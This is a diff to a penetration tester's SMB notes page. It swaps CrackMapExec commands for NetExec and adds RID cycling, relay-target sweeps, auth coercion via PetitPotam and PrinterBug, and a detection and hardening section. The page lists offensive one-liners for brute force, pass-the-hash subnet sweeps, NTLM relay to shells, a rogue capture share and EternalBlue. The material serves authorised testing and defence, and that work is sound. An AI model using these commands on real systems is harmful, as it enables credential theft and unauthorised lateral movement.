@@ -1,3 +1,5 @@
+# SMB
+
 #SMB #ServerMessageBlock #CIFS #Samba #filetransfer
 
 ## What is SMB?
@@ -23,6 +25,27 @@ Server Message Block — network file sharing protocol. Dominant in Windows envi
 
 ---
 
+## Tools
+
+| Tool | Use |
+|---|---|
+| [[Tools/Lateral Movement/NetExec\|NetExec]] | The workhorse — enum shares/users/pol, spray, PtH, RID-brute, modules (`spider_plus`) |
+| [[Tools/Lateral Movement/smbclient\|smbclient]] | Interactive share access, null-session listing, download/upload |
+| [[Tools/Lateral Movement/smbmap\|smbmap]] | Share permission mapping + recursive listing/download |
+| [[Tools/Lateral Movement/enum4linux\|enum4linux-ng]] | All-in-one SMB/RPC enumeration |
+| [[Tools/Lateral Movement/RPCclient\|rpcclient]] | Null-session RPC enum (`enumdomusers`, `netshareenumall`) |
+| [[Tools/Lateral Movement/impacket\|impacket]] | `psexec`/`smbexec`/`wmiexec`/`atexec` exec + PtH |
+| [[Tools/Lateral Movement/ntlmrelayx\|ntlmrelayx]] | NTLM relay to SMB (signing off) |
+| [[Tools/Lateral Movement/responder\|responder]] | Capture/poison NetNTLM for relay/cracking |
+| [[Tools/File Transfer/SMBserver\|impacket-smbserver]] | Host a rogue share for payload delivery / hash capture |
+| [[Tools/Scanning/NMAP\|NMAP]] | `smb-enum-*`, `smb-os-discovery`, `smb-vuln*` NSE |
+| [[Tools/Payloads & Shells/metasploit\|metasploit]] | `ms17_010_eternalblue` and SMB aux/exploit modules |
+| [[Tools/Auth/Hydra\|Hydra]] | Online brute (`smb://`) |
+
+> [!warning] **CrackMapExec is deprecated — use NetExec (`nxc`).** CME is abandoned; NetExec is the maintained fork with the same syntax (`nxc smb ...`). Commands below use `nxc`; the old `crackmapexec`/`cme` binary still exists on some boxes but don't build new workflows on it.
+
+---
+
 ## Enumeration
 
 ```bash
@@ -34,18 +57,25 @@ nmap -p 445 --script smb-vuln* <target>  # check for known vulnerabilities
 enum4linux-ng -A <target>
 enum4linux-ng -A -C <target>  # with additional checks
 
-# CrackMapExec
-crackmapexec smb <target>
-crackmapexec smb <target> -u '' -p '' --shares      # null session shares
-crackmapexec smb <target> -u guest -p '' --shares   # guest access
-crackmapexec smb <target> -u <user> -p <pass> --shares
-crackmapexec smb <target> -u <user> -p <pass> --users
-crackmapexec smb <target> -u <user> -p <pass> --groups
-crackmapexec smb <target> -u <user> -p <pass> --pass-pol
+# NetExec (nxc)
+nxc smb <target>
+nxc smb <target> -u '' -p '' --shares      # null session shares
+nxc smb <target> -u guest -p '' --shares   # guest access
+nxc smb <target> -u <user> -p <pass> --shares
+nxc smb <target> -u <user> -p <pass> --users
+nxc smb <target> -u <user> -p <pass> --groups
+nxc smb <target> -u <user> -p <pass> --pass-pol
+
+# RID cycling — enumerate domain users through a null/guest session even when --users is blocked
+nxc smb <target> -u guest -p '' --rid-brute
+nxc smb <target> -u '' -p '' --rid-brute 10000
 
 # spider_plus — search shares for sensitive files
-crackmapexec smb <target> -u <user> -p <pass> -M spider_plus
-crackmapexec smb <target> -u <user> -p <pass> -M spider_plus -o READ_ONLY=false
+nxc smb <target> -u <user> -p <pass> -M spider_plus
+nxc smb <target> -u <user> -p <pass> -M spider_plus -o READ_ONLY=false
+
+# Find relay targets in one sweep — hosts with SMB signing NOT required
+nxc smb <target>/24 --gen-relay-list relay_targets.txt
 
 # smbmap
 smbmap -H <target>                           # list shares (unauthenticated)
@@ -155,17 +185,17 @@ sudo impacket-smbserver share ./ -smb2support -user attacker -password Password1
 ### Brute Force
 
 ```bash
-crackmapexec smb <target> -u users.txt -p passwords.txt --no-bruteforce
-crackmapexec smb <target> -u users.txt -p passwords.txt
+nxc smb <target> -u users.txt -p passwords.txt --no-bruteforce
+nxc smb <target> -u users.txt -p passwords.txt
 hydra -L users.txt -P passwords.txt smb://<target>
 ```
 
 ### Pass-the-Hash (PTH)
 
 ```bash
-# CrackMapExec PTH
-crackmapexec smb <target> -u <user> -H <NTLM_hash>
-crackmapexec smb <target>/24 -u <user> -H <NTLM_hash>  # sweep subnet
+# NetExec (nxc) PTH
+nxc smb <target> -u <user> -H <NTLM_hash>
+nxc smb <target>/24 -u <user> -H <NTLM_hash>  # sweep subnet
 
 # smbclient PTH
 smbclient //<target>/C$ -U user%hash --pw-nt-hash
@@ -208,6 +238,8 @@ sudo ntlmrelayx.py -tf targets.txt -smb2support -i  # interactive shell
 sudo ntlmrelayx.py -tf targets.txt -smb2support -c 'whoami'
 ```
 
+> [!tip] **Coerce the auth instead of waiting for it.** Relay is far more reliable when you *force* a victim to authenticate: PetitPotam (`petitpotam.py <attacker> <target>`, MS-EFSRPC), the PrinterBug (`printerbug.py`/`dementor.py`, MS-RPRN), or `nxc smb <dc> -M coerce_plus` to find coercion surface. Point the coerced auth at `ntlmrelayx`, and relay to LDAP(S) for RBCD/shadow-cred escalation, not just SMB. Only signing-*not-required* targets (from `--gen-relay-list`) are valid SMB relay destinations.
+
 ### EternalBlue (MS17-010) — SMBv1
 
 ```bash
@@ -216,6 +248,16 @@ set RHOSTS <target>
 set LHOST <attacker>
 run
 ```
+
+---
+
+## Detection & Artefacts
+
+- **`psexec.py` is loud**: it creates a service (default random-named) and drops a binary in `ADMIN$` → Windows event **7045** (service install) + **4697**, plus **4624 type 3** logons. `smbexec`/`wmiexec` are quieter (no service binary) but `wmiexec` still spawns `wmiprvse.exe`→`cmd.exe`.
+- **NTLM relay / coercion**: a flood of **4624/4625** from one source, or EFSRPC/RPRN calls (PetitPotam/PrinterBug) to a DC, are the coercion tells; relayed logons show the *attacker* IP with a victim account.
+- **RID-brute / null-session enum** = many **4625**/anonymous logons enumerating SIDs.
+- **Rogue `impacket-smbserver`** captures NetNTLMv2 when a victim browses to it — the artefact is an outbound SMB connection from the victim to an unexpected host.
+- Defensive baseline: disable SMBv1, **require SMB signing** (kills relay), block outbound 445, enforce strong auth, restrict admin-share access, and turn off coercion surfaces (patch PetitPotam, disable Spooler on DCs).
 
 ---
 
@@ -240,7 +282,17 @@ run
 | List shares (authenticated) | `smbmap -H host -u user -p pass` |
 | Enum all | `enum4linux-ng -A host` |
 | Connect to share | `smbclient //host/share -U user%pass` |
-| PTH with CME | `crackmapexec smb host -u user -H hash` |
+| PTH with nxc | `nxc smb host -u user -H hash` |
 | PTH with psexec | `psexec.py domain/user@host -hashes :NTLM` |
-| Brute force | `crackmapexec smb host -u users.txt -p pass.txt` |
+| Brute force | `nxc smb host -u users.txt -p pass.txt` |
 | Vuln check | `nmap -p 445 --script smb-vuln* host` |
+
+---
+
+> [!note] **See also** — Unix file-share siblings [[Services/File Xfer/NFS|NFS]] (the Linux equivalent; `no_root_squash`/UID-spoof privesc) and [[Services/File Xfer/Rsync|Rsync]] (daemon module read/write). Windows remote-exec/management siblings that share the RPC/DCOM transport: [[Services/Local System Management/RPC|RPC]], [[Services/Local System Management/WMI|WMI]], [[Services/Local System Management/WinRM|WinRM]]. Coerced/poisoned name resolution feeding relay comes from [[Services/Network management/DNS|DNS]] (ADIDNS WPAD/wildcard) + [[Tools/Lateral Movement/responder|responder]]; the same coerced auth relays to [[Services/Network management/LDAP|LDAP]] (RBCD/shadow creds) when SMB signing blocks the 445 target. Broadcast name-poisoning that captures the auth in the first place is [[Services/Network management/NetBIOS|NetBIOS]] (NBNS/LLMNR → responder).
+
+---
+
+*Created: 2026-07-13*
+*Updated: 2026-09-23*
+*Model: claude-opus-4-8*
